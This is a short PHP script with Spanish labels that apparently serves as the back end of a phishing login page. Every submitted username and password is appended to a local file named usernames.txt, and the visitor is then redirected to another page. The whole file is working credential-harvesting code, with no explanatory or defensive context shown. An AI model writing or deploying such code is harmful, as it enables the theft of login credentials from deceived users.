<?php

file_put_contents("usernames.txt", "Usuario: " . $_POST['text'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: redir/redir.html');
exit();
